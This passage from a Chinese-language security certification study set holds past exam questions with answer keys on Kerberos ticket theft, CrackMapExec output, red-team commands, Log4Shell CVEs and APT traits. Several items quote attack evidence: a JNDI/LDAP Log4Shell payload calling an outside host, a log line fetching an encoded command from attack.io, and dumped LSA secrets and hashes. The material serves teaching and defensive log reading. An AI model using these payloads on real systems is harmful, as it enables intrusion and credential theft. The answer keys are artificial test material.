00-bob_adm@krbtgt-（遮蔽）.kirbi\n[0;14149a]-2-1-40e10000-bob_adm@krbtgt-（遮蔽）.kirbi\n[0;141473]-0-0-40a50000-bob_adm@ldap-DC1.（遮蔽）.kirbi\n[0;141473]-0-1-40a50000-bob_adm@LDAP-DC1（遮蔽）.kirbi\n[0;141473]-2-0-40e10000-bob_adm@krbtgt-（遮蔽）.kirbi\nmimikatz（Application，修改時間 13/03/2021 14:54，大小 1,279 KB）",
     "hint": "看附圖中的檔案副檔名、檔名與工具，逐項判斷哪一種攻擊會產生這些檔案。",
     "explanation": "答案 B。附圖三的檔案是 .kirbi（Kerberos 票證檔），檔名含 krbtgt、ldap、cifs 等，並且旁邊有 mimikatz，是把記憶體中的票證匯出以便重放，屬 Pass the Ticket。A 阻斷服務攻擊以流量或資源耗盡為特徵；C 緩衝區溢位是程式漏洞利用；D 目錄同步（DCSync）攻擊是模擬 DC 複寫索取密碼資料，不會產生一批 .kirbi 票證檔。",
     "source": "114-1 第7題"
    },
    {
     "stem": "情境如附圖所示。滲透測試的外包商在進行檢測時，發現網站根目錄下存在不少的 PHP 檔案，例如有 1111.PHP, Shell.php, probe.php 還發現了一些副檔名為.dump 的檔案，其中有一個檔案開啟後如附圖一所示。請問此檔案為下列何項？",
     "options": [
      "這是偵錯的 log 檔案",
      "這是登入成功、失敗的安全性事件",
      "這是 CRACKMAPEXEC 分析密碼的結果檔",
      "這是 mimikatz 另存出來的結果檔"
     ],
     "answer": 2,
     "context": "你是一間跨國企業的資安管理人員，你每一年都必須針對集團、子集團進行安全檢測與合規要求的驗證，在台灣由於集團參與了我國 A 級機關的軟體開發案，你必須針對組織的流程及服務進行合規的證明，你目前必須完成的包含有核心系統的滲透測試、採購的第三方套件商提供的源碼檢測報告及協助集團提交主要服務的系統開發流程的相關資安證明。\n附圖一\nSMB 192.168.0.76 445 DC [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:test.lab) (signing:True) (SMBv1:True)\nSMB 192.168.0.76 445 DC [+] test.lab\\testadmin:Password123 (Pwn3d!)\nSMB 192.168.0.76 445 DC [+] Dumping LSA secrets\nSMB 192.168.0.76 445 DC TEST\\DC$:aes256-cts-hmac-sha1-96:5a0f8706487aae9bf38161a4608e7567ac1c4a105226b783ccbd98274c8d4018\nSMB 192.168.0.76 445 DC TEST\\DC$:aes128-cts-hmac-sha1-96:d8402dda8272520b01ba6b8dcfd9b3d8\nSMB 192.168.0.76 445 DC TEST\\DC$:des-cbc-md5:f45b2361ae1ad308\nSMB 192.168.0.76 445 DC TEST\\DC$:plain_password_hex:4e4545a05fe307150e0679cf4169caea359467422928fec7e82b6eb63d23dfa9cb180c4c3da62ff7ce1ab1396b1fa505300bed8d7a67e36b74ab9b25721756181c47850cf9dc220964ae7c50a104cfed776f5c1cb8865bb443d9d757cd90dc1dca063ba89776825f20d7d61b7debfb5339cd69dc3c3c81b0e81c6b74065d4456a6339991fd05a5e687cd8fd0f81562a3613f7094015ab82ca0e16fca01551fdef5f397f48664cb64801215b453d29c1034aca75242c3be6aa080dd6be94ca91f712db8c6d4ca6305ee47912fa5a11bc388388fde380c3d9a712d6c8fe36b50c3cdedc4cae98d75eb9561c0a8ec13a0da\nSMB 192.168.0.76 445 DC TEST\\DC$:aad3b435b51404eeaad3b435b51404ee:6e93dbc1944a24129c85324692f4687b:::\nSMB 192.168.0.76 445 DC dpapi_machinekey:0x974d7e0eab71f962c006ae631a67883cb65fbb8e\ndpapi_userkey:0xcc3bd3a27097b37446adc6e7dc5023a3316e3a3e\nSMB 192.168.0.76 445 DC NL$KM:b4d3d7354eec7c5d18ca62845d33e65cdaf826db03b4bf401f2c3864fd56d271f908f8eefbf0d278675be217810199c6ce158550484b62fd6a280564bf305814\nSMB 192.168.0.76 445 DC [+] Dumped 7 LSA secrets to /home/t/.cme/logs/DC_192.168.0.76_2021-07-22_122314.secrets and /home/t/.cme/logs/DC_192.168.0.76_2021-07-22_122314.cached",
     "hint": "看輸出的前綴、標記與儲存路徑名稱，哪個工具會用這些痕跡？",
     "explanation": "答案 C。附圖一的輸出含 SMB、(Pwn3d!)、『Dumping LSA secrets』，並存入 /home/t/.cme/logs/…，是 CrackMapExec 的輸出特徵。A 不是除錯日誌；B 不是 Windows 登入成功／失敗的安全性事件；D mimikatz 存出的檔案格式與路徑不是這樣。",
     "source": "113-2 第38題"
    },
    {
     "stem": "情境如附圖所示，紅隊進行內部滲透測試攻擊，關於針對滲透的方法，下列何者錯誤？",
     "options": [
      "找出 DC IP 位址：nmcli dev show",
      "DNS 區域轉送：dig axfr",
      "列舉 ldap：nmap -Sp -p<ip>",
      "找出使用者：net user"
     ],
     "answer": 2,
     "context": "某企業集團希望徵求紅隊演練測試，來驗證公司內部 IT 資安防護能力，可是又擔心執行過程中讓公司內部 IT 或資安部門無法獲得溝通學習成長，身為該公司重要外部資安顧問專家。",
     "hint": "不要只看工具名，逐項核對指令選項與它宣稱的用途是否真的對得上。",
     "explanation": "答案 C。『列舉 ldap：nmap -Sp -p<ip>』的指令寫法不成立（Nmap 沒有 -Sp 這個選項），也不是列舉 LDAP 的作法，所以是錯誤的。A nmcli dev show 可顯示網路介面與 DNS 資訊，用來找 DC 的 IP；B dig axfr 是嘗試 DNS 區域轉送；D net user 可列出使用者。",
     "source": "113-1 第34題"
    }
   ]
  },
  {
   "id": "1.1-08",
   "section": "1.1",
   "title": "重大漏洞案例判讀",
   "examHits": 7,
   "examRefs": [
    "111-1 第33題",
    "111-1 第34題",
    "111-1 第35題",
    "111-1 第36題",
    "111-1 第37題",
    "109-1 第5題",
    "109-1 第6題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "重大漏洞題常用 Log4Shell（Apache Log4j 2.x 的 CVE-2021-44228 等）出題。成因是 Log4j 的 JNDI Lookup 功能：只要攻擊者控制的字串（例如 User-Agent 中的 ${jndi:ldap://…}）被寫進日誌，伺服器就會去連外部的 LDAP 伺服器載入惡意內容，造成遠端程式碼執行。判讀日誌時，看到「Error looking up JNDI resource [ldap://…]」就代表應用程式有該弱點並嘗試連線；攻擊要成功，須被記錄、能連到攻擊者伺服器。系列漏洞的性質不同：44228 是遠端執行，45105 是造成無限遞迴的阻斷服務。修補與緩解要依版本與漏洞對應。",
   "keyPoints": [
    "看到 ${jndi:ldap://…} 在 User-Agent 等標頭 → Log4Shell 攻擊嘗試；成功的前提是該內容被寫入日誌，且伺服器能連到攻擊者的伺服器。",
    "看到日誌 Error looking up JNDI resource [ldap://…] → 應用程式存在弱點並嘗試連線 LDAP（本例連線被拒），不是記憶體不足或 SMB 設定問題。",
    "Log4j 是 Java 的日誌函式庫，主要影響 2.x；JNDI 支援的協定不只 LDAP（還有如 RMI、DNS 等）。",
    "系列 CVE 要分開記：44228 是 RCE，45046 與 45105 的性質、修補版本不同，不能說三個都能 RCE。",
    "緩解方式要對應 CVE 與版本：formatMsgNoLookups=true 只對 44228 有效（2.10 以上），對 45046 多數情況無效；移除 JndiLookup 類別可擋 44228／45046；45105 要升級到 2.17.0（Java 8），或把 PatternLayout 中的 Context Lookup 改成 %X 等樣式。"
   ],
   "trap": "把三個 Log4j CVE 當成同一種漏洞（都可 RCE、同一種修法），或以為 JNDI 只支援 LDAP。",
   "quiz": [
    {
     "stem": "Apache Log4j 是一套使用非常廣泛的開放源碼的工具，方便程式設計人員在程式中加入 log function，並能以多種方式將 Log輸出到不同標的，是此類開源工具中，最受系統開發者喜愛的工具之一。只是在2021 年底Apache Log4j 軟體，出現了被稱為 10年來核彈級的一連串重大漏洞，包含 CVE-2021-44228、CVE-2021-45046、CVE-2021- 45105，請問關於這三個重大的漏洞，下列敘述何者「不」正確？",
     "options": [
      "上述的漏洞也另稱為 Log4Shell",
      "這些漏洞的影響範圍主要為 Log4j 2.x 版本",
      "上述三個漏洞都可以使駭客進行 RCE（Remote Code Execution）攻擊",
      "Log4j 2.17（含）以上的版本可以有效修補上述漏洞"
     ],
     "answer": 2,
     "hint": "逐項回想三個 CVE 各自的漏洞類型、影響範圍與修補版本，判斷每句是否成立。",
     "explanation": "答案 C。這三個漏洞的性質不同：CVE-2021-44228 是遠端程式碼執行（Log4Shell），CVE-2021-45105 是造成無限遞迴、導致阻斷服務，並非 RCE（依 Apache 公告：44228 為 RCE、CVSS 10.0；45046 在部分非預設設定下可 RCE、CVSS 9.0；45105 為無限遞迴造成的阻斷服務、CVSS 5.9；Java 8 的修補版本依序為 2.15.0、2.16.0、2.17.0）。所以『三個都可 RCE』的說法最不正確。A 這些漏洞常稱 Log4Shell；B 影響範圍主要是 Log4j 2.x；D 2.17 以上版本可有效修補，題目採此說法。",
     "source": "111-1 第33題"
    },
    {
     "stem": "關於 Log4j 的功能或應用，下列敘述何者正確？",
     "options": [
      "Log4j 是基於.NET所開發的日誌工具",
      "CVE-2021-44228此漏洞遭開發的來源功能，主要為 Log4j JNDI （Java Naming and Directory Interface）功能",
      "JndiLookup.class 所支援的通訊協定僅限於輕型目錄存取協定（LDAP）",
      "Log4j 工具僅能使用於 Web伺服器"
     ],
     "answer": 1,
     "hint": "逐項回想 Log4j 的開發語言、被利用的功能與 JNDI 支援的協定，判斷每句是否成立。",
     "explanation": "答案 B。CVE-2021-44228 被利用的來源功能是 Log4j 的 JNDI（Java Naming and Directory Interface）功能。A Log4j 是 Java 日誌函式庫，不是 .NET；C JndiLookup 支援的協定不只 LDAP；D Log4j 可用在各種 Java 應用，不限 Web 伺服器。",
     "source": "111-1 第34題"
    },
    {
     "stem": "當前述三個漏洞發生之後，資安工程師在監控這類攻擊時，發現疑似為 CVE-2021-44228 攻擊者所發送之攻擊嘗試，並由攻擊封包中解析出以下內容：User-Agent：/${jndi:ldap://1.2.3.4:1389/Exploit}，下列敘述何者「不」正確？",
     "options": [
      "這個攻擊若是攻擊成功（有效攻擊），攻擊成功的前提是受攻擊者會將此一攻擊內容，寫入日誌檔案中",
      "這個攻擊者必須於遠端建立 LDAP 伺服器",
      "如果受攻擊伺服器無法對外連線，此一攻擊將無法成功",
      "上述攻擊樣態，若將 jndi:ldap，改為 jndi:rms，也會是jndi 所能支援的通訊協定"
     ],
     "answer": 3,
     "hint": "逐項回想 Log4Shell 攻擊成立的條件與 JNDI 支援的協定，判斷每句是否成立。",
     "explanation": "答案 D。攻擊字串 ${jndi:ldap://1.2.3.4:1389/Exploit} 要成功：A 必須被寫入日誌；B 攻擊者須在遠端架設 LDAP 伺服器；C 受害伺服器若無法對外連線就載不到內容，攻擊無法成功。D 說把 jndi:ldap 改為 jndi:rms 也是 JNDI 支援的協定是錯的，JNDI 支援的是 rmi，不是 rms。",
     "source": "111-1 第35題"
    },
    {
     "stem": "關於 CVE-2021-44228、CVE-2021-45046、CVE-2021-45105 此一系列漏洞的修補或緩解措施，下列敘述哪些正確？",
     "options": [
      "對於 Log4j V2.10之後的版本，將系統屬性 log4j2.formatMsgNoLookups 設為 True可以防止 CVE-2021-45046 之攻擊",
      "對於 Log4j V2.10之後的版本，將 JndiLookup.class 移除可以防止 CVE-2021-44228之攻擊",
      "對於CVE-2021-45105，除將 Log4j 的版本升級至 2.16版（含）之上，無其他方式可以緩解對此一漏洞的攻擊",
      "對於CVE-2021-45105 而言，其漏洞會造成無限迴圈問題，所以其禁止具漏洞的伺服器對外連線無法緩解此一漏洞之影響"
     ],
     "answer": [
      0,
      2
     ],
     "context": "  .   ____          _            __ _ _\n /\\\\ / ___'_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  '  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::                (v2.6.1)\n\n2022-01-11 11:12:35.849  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : Starting VulnerableAppApplication using Java 1.8.0_181 on fb35eb8e05ff with PID 1 (/app/spring-boot-application.jar started by root in /)\n2022-01-11 11:12:35.864  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : No active profile set, falling back to default profiles: default\n2022-01-11 11:12:37.261  INFO 1 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)\n2022-01-11 11:12:37.339  INFO 1 --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]\n2022-01-11 11:12:37.340  INFO 1 --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.55]\n2022-01-11 11:12:37.409  INFO 1 --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext\n2022-01-11 11:12:37.409  INFO 1 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1439 ms\n2022-01-11 11:12:37.942  INFO 1 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''\n2022-01-11 11:12:37.960  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : Started VulnerableAppApplication in 2.656 seconds (JVM running for 3.61)\n2022-01-11 11:12:45.755  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'\n2022-01-11 11:12:45.756  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'\n2022-01-11 11:12:45.759  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 3 ms\n2022-01-11 11:12:45.806  WARN 1 --- [nio-8080-exec-1] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:18:26.005  WARN 1 --- [nio-8080-exec-3] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:18:54.334  WARN 1 --- [nio-8080-exec-4] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:19:41.949  WARN 1 --- [nio-8080-exec-5] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:23:43,950 http-nio-8080-exec-6 WARN Error looking up JNDI resource [ldap://attack.io:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=]. javax.naming.CommunicationException: attack.io:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]\n        at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)\n        at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)\n        at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1615)\n        at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)\n        at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)\n        at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)\n        at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)\n        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)\n        at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)\n        at javax.naming.InitialContext.lookup(InitialContext.java:417)",
     "hint": "逐項對照 Apache 對三個 CVE 公布的修補版本與緩解方式，判斷每句是否成立；本題官方答案與公告有落差，答完請看解析。",
     "explanation": "答案 A、C。官方採 A、C，但依 Apache 與 Red Hat 公告逐項判斷，結果幾乎相反，列為爭議題，作答以官方答案為準：A 把 log4j2.formatMsgNoLookups 設為 true 是針對 CVE-2021-44228 的早期緩解，Red Hat 公告明言它在多數情況下無法緩解 CVE-2021-45046（45046 要升級到 2.16.0，或從 classpath 移除 JndiLookup 類別）；B 從 classpath 移除 JndiLookup.class 是 Apache 公告的 44228／45046 緩解方式，字面上正確；C 2.16.0 仍受 CVE-2021-45105 影響，修補版本是 2.17.0（Java 8）、2.12.3（Java 7）、2.3.1（Java 6），Apache 另列有設定面的緩解（把 PatternLayout 裡 ${ctx:…} 這類 Context Lookup 改成 %X 等 Thread Context Map 樣式），所以「只有升級一途」字面上不成立；D CVE-2021-45105 是自我參照的 Lookup 造成無限遞迴（阻斷服務），與對外連線無關，禁止伺服器對外連線確實無法緩解，字面上正確。官方未說明理由。",
     "source": "111-1 第36題"
    },
    {
     "stem": "分析應用程式日誌中的訊息，下列敘述何者正確？",
     "options": [
      "應用程式疑似連線至外部網站，並且成功下載惡意軟體",
      "應用程式疑似設定錯誤，後端 SMB伺服器無法正常連線",
      "應用程式疑似存在弱點，並嘗試連線 LDAP 伺服器",
      "應用程式疑似記憶體不足，無法完成 LDAP 伺服器連線"
     ],
     "answer": 2,
     "context": "【題組5】\n某網站維護人員發現其網頁應用程式伺服器回應緩慢，因此進行應用程式效能分析與除錯，發現應用程式日誌中有以下的異常錯誤訊息：\n  .   ____          _            __ _ _\n /\\\\ / ___'_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  '  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::                (v2.6.1)\n\n2022-01-11 11:12:35.849  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : Starting VulnerableAppApplication using Java 1.8.0_181 on fb35eb8e05ff with PID 1 (/app/spring-boot-application.jar started by root in /)\n2022-01-11 11:12:35.864  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : No active profile set, falling back to default profiles: default\n2022-01-11 11:12:37.261  INFO 1 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)\n2022-01-11 11:12:37.339  INFO 1 --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]\n2022-01-11 11:12:37.340  INFO 1 --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.55]\n2022-01-11 11:12:37.409  INFO 1 --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext\n2022-01-11 11:12:37.409  INFO 1 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1439 ms\n2022-01-11 11:12:37.942  INFO 1 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''\n2022-01-11 11:12:37.960  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : Started VulnerableAppApplication in 2.656 seconds (JVM running for 3.61)\n2022-01-11 11:12:45.755  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'\n2022-01-11 11:12:45.756  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'\n2022-01-11 11:12:45.759  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 3 ms\n2022-01-11 11:12:45.806  WARN 1 --- [nio-8080-exec-1] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:18:26.005  WARN 1 --- [nio-8080-exec-3] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:18:54.334  WARN 1 --- [nio-8080-exec-4] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:19:41.949  WARN 1 --- [nio-8080-exec-5] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:23:43,950 http-nio-8080-exec-6 WARN Error looking up JNDI resource [ldap://attack.io:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=]. javax.naming.CommunicationException: attack.io:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]\n        at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)\n        at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)\n        at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1615)\n        at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)\n        at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)\n        at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)\n        at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)\n        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)\n        at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)\n        at javax.naming.InitialContext.lookup(InitialContext.java:417)",
     "hint": "把日誌中的關鍵詞（協定、主機、錯誤類型）抄下來，逐項判斷每個選項的描述是否與日誌相符。",
     "explanation": "答案 C。日誌出現『Error looking up JNDI resource [ldap://attack.io:1389/…]』與一長串 com.sun.jndi.ldap 呼叫堆疊，代表應用程式在處理輸入時嘗試以 JNDI 查詢外部 LDAP 資源，疑似存在 Log4j JNDI 弱點（Base64 內容解碼為 touch /tmp/pwned）；因 Connection refused 而失敗，並非成功下載。A 日誌並無成功下載惡意軟體；B 協定是 LDAP 不是 SMB；D 錯誤原因是連線被拒，不是記憶體不足。",
     "source": "111-1 第37題"
    }
   ]
  },
  {
   "id": "1.1-09",
   "section": "1.1",
   "title": "APT 與常見攻擊類型",
   "examHits": 7,
   "examRefs": [
    "115-1 第3題",
    "113-2 第1題",
    "113-2 第2題",
    "113-2 第3題",
    "113-1 第3題",
    "112-1 第3題",
    "112-1 第27題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "APT（進階持續性威脅）是有目標、有組織、長時間潛伏的攻擊：先做情報蒐集，常用社交工程加零時差漏洞取得初始入侵點，接著提權、橫向移動，並建立多條 C2 通道避免被一刀切斷，惡意程式常量身訂做。它的重點是「持續」，所以「24 小時內結束」「不具持久性」「針對一般腳本小子」都是錯誤描述。考試也會比較其他常見威脅：內部威脅（無意或故意）、零日攻擊（廠商尚未修補的未公開漏洞）、惡意軟體（病毒、蠕蟲、木馬、勒索軟體）。紅隊演練則是模擬真實攻擊，從外網入侵、社交工程到實體近接都可能涵蓋。",
   "keyPoints": [
    "看到 APT → 有針對性、長期潛伏、客製化工具、多條 C2、提權與橫向移動；『短時間完成』『非針對特定對象』都是錯的。",
    "看到零日 → 廠商還沒修補或未公開的漏洞；已有修補卻沒更新的是舊漏洞（n-day），不是零日。",
    "看到中間人攻擊 → 在雙方通訊中攔截或竄改；用大量請求癱瘓服務是 DoS／DDoS，別混。",
    "紅隊演練範圍可含：外網漏洞、內網橫向移動、釣魚社交工程、實體近接（如破解 Wi-Fi）、利用供應商入口的業務邏輯。",
    "內部威脅來自組織內人員，可能無意也可能故意；勒索軟體多為財務動機，不等於地緣政治動機。"
   ],
   "trap": "把 APT 當成「很快的大規模攻擊」；以及把 MITM 與 DDoS 的描述互換。",
   "quiz": [
    {
     "stem": "駭客為了追求最大利益，將亂槍打鳥的隨機攻擊轉換成目標式攻擊，進階持續性威脅（Advanced Persistent Threats，APT）即是最難防禦的目標式攻擊。關於APT 攻擊的敘述，下列何者最「不」適切？",
     "options": [
      "APT攻擊常透過社交工程結合零時差（Zero-day）漏洞取得初始入侵點",
      "APT行動通常僅在短時間內完成，整個攻擊週期不會超過 24小時",
      "攻擊者會建立多條指揮控制（C2）通道，以降低被完全阻斷的風險",
      "APT攻擊往往伴隨嚴謹的情報蒐集與量身訂做的惡意程式，以提高成功率"
     ],
     "answer": 1,
     "hint": "回想 APT 的定義與典型特徵，逐項判斷每句描述是否符合。",
     "explanation": "答案 B。APT 的『Persistent』就是長期持續，攻擊週期往往以週、月甚至更久計，不是 24 小時內結束，所以 B 最不適切。A 社交工程結合零時差取得初始入侵點是常見手法；C 建立多條 C2 通道降低被完全阻斷風險；D 針對目標做情報蒐集並量身訂做惡意程式提高成功率，都是 APT 的特徵。",
     "source": "115-1 第3題"
    },
    {
     "stem": "針對駭客攻擊手法，下列敘述何者錯誤？",
     "options": [
      "SQL 注入式攻擊（SQL Injection）：攻擊者會嘗試將惡意 SQL 代碼注入到一個網站的資料庫查詢中，從而獲得未授權的存取權限或提取資料",
      "跨站腳本攻擊（Cross-site Scripting，XSS）：攻擊者會將惡意腳本注入到信任的網站中。當其他使用者存取該網站時，他們的瀏覽器會執行這些腳本，可能導致資料洩露",
      "中間人攻擊（Man in the middle attack）：這種攻擊包括使用多台電腦（通常是受感染的，並被攻擊者控制的電腦）來發起大量的請求，導致竊取偷聽、重新導向通訊",
      "釣魚攻擊（Phishing）：攻擊者會偽裝成可信任的實體（例如銀行或社交媒體網站），嘗試欺騙使用者透露他們的登錄資訊、信用卡號或其他敏感資訊"
     ],
     "answer": 2,
     "hint": "題目問『錯誤』：對每個攻擊名稱，先回想它真正的運作方式，再比對描述，找出名稱和描述對不上的那組。",
     "explanation": "答案 C。中間人攻擊（MITM）是在通訊雙方之間攔截、偷聽或竄改封包，題目 C 的描述（用多台受感染電腦發出大量請求）其實是分散式阻斷服務（DDoS）的特徵，與 MITM 不符，所以錯誤。A SQL 注入、B 跨站腳本、D 釣魚的描述都符合其定義。",
     "source": "113-2 第1題"
    },
    {
     "stem": "針對 APT 攻擊（Advanced Persistent Threat），下列敘述何者正確？",
     "options": [
      "APT 常用技術手法，如：Privilege Escalation 提權、 Lateral Movement 橫向移動",
      "常見於一般腳本小子（Script Kiddie）",
      "非針對特定對象之入侵行為",
      "利用零日漏洞、客製化的惡意軟體，缺點是不具備匿名性與持久性"
     ],
     "answer": 0,
     "hint": "回想 APT 的定義與典型特徵，逐項判斷每句描述是否符合。",
     "explanation": "答案 A。APT 常見技術包括權限提升（Privilege Escalation）與橫向移動（Lateral Movement）。B 腳本小子是技術較低、用現成工具的人，並非 APT 主體；C APT 是針對特定對象，不是非針對性入侵；D 說缺點是不具匿名性與持久性，與 APT 強調持久與隱匿相反。",
     "source": "113-2 第2題"
    },
    {
     "stem": "下列哪幾種方式是檢測人員執行紅隊演練過程中可能會使用的攻擊手法？",
     "options": [
      "在 DMZ 網頁伺服器找到 RCE 漏洞並取得系統控制權，然後在內網進行橫向移動，嘗試取得 Windows Server Active Directory（AD）的控制權",
      "透過釣魚信件對企業的海外分公司員工進行社交工程，取得員工電腦控制權，然後讀取員工電子郵件信箱，尋找可以拿來利用的機敏資料",
      "移動到企業所在的樓層，側錄 Wi-Fi 然後嘗試破解密碼，取得企業 Wi-Fi 的存取方式，入侵企業內部網路",
      "註冊成為企業的供應商，並且利用供應商專用網站造假資料、竄改商品金額，驗證攻擊者可以用更低的價格買進商品"
     ],
     "answer": [
      0,
      1,
      2,
      3
     ],
     "hint": "紅隊演練的目標是模擬真實對手，思考每一項是否屬於『攻擊者在真實世界可能採用的路徑』。",
     "explanation": "答案 A、B、C、D。四項都是紅隊演練可能使用的手法：A 從 DMZ 的 RCE 取得控制後在內網橫向移動、攻 AD；B 對海外分公司員工釣魚，取得電腦控制權後蒐集信箱敏感資料；C 實體近接，側錄 Wi-Fi 後破解密碼入侵內網；D 註冊成為供應商，濫用供應商網站的業務邏輯（造假資料、竄改商品金額）來驗證風險。（官方公告 A、B、C、D 或 A、B、C 兩組答案都給分，官方未說明為何 D 可不選。）",
     "source": "113-2 第3題"
    },
    {
     "stem": "關於在資訊安全中，威脅或攻擊具多種因素與手法的敘述，下列哪些正確？",
     "options": [
      "基於地緣政治動機的威脅分類：如政治意識形態；社會報復等，台灣近期有發生製造業遭勒索加密案例，就屬於這類型態",
      "內部威脅（Insider threats）：這種威脅來自組織內部的人員，可能無意或故意地洩漏敏感資訊，或損害系統及公司利益",
      "零日攻擊（Zero-day attacks）：這類攻擊利用尚未正式公開漏洞，在廠商還沒修補漏洞前，就被利用發動攻擊",
      "惡意軟體（Malware）：這包括了病毒、蠕蟲、特洛伊木馬、勒索軟體等，他們可以破壞系統，竊取數據，或無授權地使用系統資源"
     ],
     "answer": [
      1,
      2,
      3
     ],
     "hint": "逐項判斷：每種威脅的定義是否正確？所舉的例子是否屬於該分類？",
     "explanation": "答案 B、C、D。B 內部威脅來自組織內人員，可能無意或故意造成洩漏；C 零日攻擊利用尚未被廠商修補（未公開）的漏洞；D 惡意軟體包含病毒、蠕蟲、木馬、勒索軟體等。A 以地緣政治動機分類的威脅，與製造業遭勒索加密不同，勒索軟體多屬財務動機，所以 A 描述不正確。（官方公告 A、B、C、D 與 B、C、D 兩組答案都給分，官方未說明理由。）",
     "source": "113-1 第3題"
    }
   ]
  },
  {
   "id": "1.1-10",
   "section": "1.1",
   "title": "社交工程與釣魚手法",
   "examHits": 5,
   "examRefs": [
    "115-1 第16題",
    "114-2 第3題",
    "112-1 第10題",
    "112-1 第18題",
    "111-1 第26題"
   ],
   "guidePages": "",
   "inGuide": true,
